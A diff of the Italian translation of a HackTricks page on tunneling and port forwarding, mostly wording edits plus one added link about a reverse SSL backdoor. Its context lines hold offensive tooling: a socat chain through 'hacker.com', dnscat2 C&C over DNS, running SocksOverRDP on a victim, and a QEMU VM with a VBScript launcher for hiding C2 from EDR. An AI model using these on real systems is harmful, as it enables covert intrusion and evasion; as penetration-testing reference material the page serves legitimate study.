@@ -1,11 +1,11 @@
-# Tunneling e Port Forwarding
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Suggerimento Nmap
+## Nmap tip
 
 > [!WARNING]
-> Le scansioni **ICMP** e **SYN** non possono essere tunnelizzate attraverso i proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare le **scansioni TCP** (`-sT`) affinché questo funzioni.
+> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **TCP scans** (`-sT`) affinché questo funzioni.
 
 ## **Bash**
 
@@ -94,7 +94,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
-Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
+Ad esempio, inoltrando tutto il traffico verso 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -294,7 +294,9 @@ Puoi bypassare un **proxy non autenticato** eseguendo questa riga invece dell'ul
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-### SSL Socat Tunnel
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
+### Tunnel SSL Socat
 
 **/bin/sh console**
 
@@ -345,10 +347,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-È necessario avere **accesso RDP al sistema**.\
+È necessario avere **accesso RDP sul sistema**.\
 Scarica:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzionalità Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti attraverso la connessione RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzionalità Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Nel tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
@@ -358,7 +360,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
 
-**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
+**Connetti** tramite **RDP** e carica ed esegui nel computer della vittima il binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -366,7 +368,7 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per proxyare il traffico attraverso quella porta.**
+Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per proxy il traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
@@ -385,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autenticandosi contro un proxy, crea un collegamento a una porta locale che viene inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
+Autenticandosi contro un proxy, crea un binding di una porta localmente che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
 Ad esempio, inoltra la porta 443.
 ```
 Username Alice
@@ -421,7 +423,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Scaricalo da qui**](https://github.com/iagox86/dnscat2)**.**
 
-Stabilisce un canale C\&C attraverso DNS. Non richiede privilegi di root.
+Stabilisce un canale C\&C tramite DNS. Non richiede privilegi di root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -457,7 +459,7 @@ Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la rich
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
+È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -610,7 +612,7 @@ Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:900
 
 ## Tunnel Covert basati su VM con QEMU
 
-Il networking in modalità utente di QEMU (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **collega una porta TCP/UDP sull'*host* e la inoltra nel *guest***. Quando il guest esegue un daemon SSH completo, la regola hostfwd ti offre una jump box SSH usa e getta che vive interamente all'interno di una VM effimera – perfetta per nascondere il traffico C2 da EDR poiché tutta l'attività e i file malevoli rimangono nel disco virtuale.
+Il networking in modalità utente di QEMU (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **collega una porta TCP/UDP sull'*host* e la inoltra nel *guest***. Quando il guest esegue un daemon SSH completo, la regola hostfwd ti fornisce una jump box SSH usa e getta che vive interamente all'interno di una VM effimera – perfetta per nascondere il traffico C2 da EDR poiché tutta l'attività e i file malevoli rimangono nel disco virtuale.
 
 ### Quick one-liner
 ```powershell
@@ -624,7 +626,7 @@ qemu-system-x86_64.exe ^
 ```
 • Il comando sopra avvia un'immagine di **Tiny Core Linux** (`tc.qcow2`) nella RAM.  
 • La porta **2222/tcp** sull'host Windows è inoltrata in modo trasparente a **22/tcp** all'interno del guest.  
-• Dal punto di vista dell'attaccante, il target espone semplicemente la porta 2222; tutti i pacchetti che la raggiungono sono gestiti dal server SSH in esecuzione nella VM.  
+• Dal punto di vista dell'attaccante, il target espone semplicemente la porta 2222; qualsiasi pacchetto che la raggiunge è gestito dal server SSH in esecuzione nella VM.  
 
 ### Avvio furtivo tramite VBScript
 ```vb
@@ -638,7 +640,7 @@ Eseguire lo script con `cscript.exe //B update.vbs` mantiene la finestra nascost
 
 Poiché Tiny Core è senza stato, gli attaccanti di solito:
 
-1. Posizionano il payload in `/opt/123.out`
+1. Posano il payload in `/opt/123.out`
 2. Aggiungono a `/opt/bootlocal.sh`:
 
 ```sh
